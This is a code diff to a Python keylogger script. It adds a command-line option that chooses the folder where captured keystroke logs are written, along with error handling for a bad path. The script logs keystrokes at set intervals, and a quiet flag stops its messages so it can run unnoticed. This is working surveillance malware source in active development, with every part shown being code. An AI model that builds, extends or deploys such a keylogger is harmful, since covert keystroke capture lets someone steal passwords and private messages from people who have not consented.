@@ -4,10 +4,11 @@ from datetime import datetime
 from optparse import OptionParser
 
 class Keylogger:
-    def __init__(self, interval, hidden=False) -> None:
+    def __init__(self, interval, hidden=False, folder=".") -> None:
         self.interval = interval
         self.log = ""
         self.isHidden = hidden
+        self.folder = folder + "/"
     
     def callback(self, event):
         """
@@ -35,11 +36,15 @@ class Keylogger:
         self.filename = f"keylog-{str(datetime.now())[:-7].replace(' ', '_').replace(':', '')}"
         
     def report_to_file(self):
-        with open(f"{self.filename}.txt", "w") as f:
-            print(self.log, file=f)
-            
-            if not self.isHidden:
-                print(f"[+] Saved {self.filename}.txt")
+        try:
+            with open(f"{self.folder}/{self.filename}.txt", "w") as f:
+                print(self.log, file=f)
+                
+                if not self.isHidden:
+                    print(f"[+] Saved {self.filename}.txt")
+        except FileNotFoundError:
+            print("Invalid File Location")
+            exit(0)
             
     def report(self):
         if self.log:
@@ -64,6 +69,7 @@ if __name__ == "__main__":
     parser = OptionParser(usage="usage : keylogger -i <interval>")
     parser.add_option("-i", "--interval", dest="interval", metavar="INTERVAL", help="the interval at which a keylog is to be saved (in seconds)")    # Interval Variable
     parser.add_option("-q", "--quiet", action="store_true", dest="isHidden", default=False, help="don't print messages to stdout")                   # Quiet Variable
+    parser.add_option("-f", "--folder", dest="folder", default=".", metavar="FOLDER", help="folder in which logs are to be stored")                               # Folder Variable
     (options, args) = parser.parse_args()
     
     if options.interval == None:
@@ -72,9 +78,10 @@ if __name__ == "__main__":
     
     interval = int(options.interval)
     quiet = options.isHidden
+    folder = options.folder
     
     try:
-        keylogger = Keylogger(interval, quiet)
+        keylogger = Keylogger(interval, quiet, folder=folder)
         keylogger.start()
     except KeyboardInterrupt:
         if not quiet:
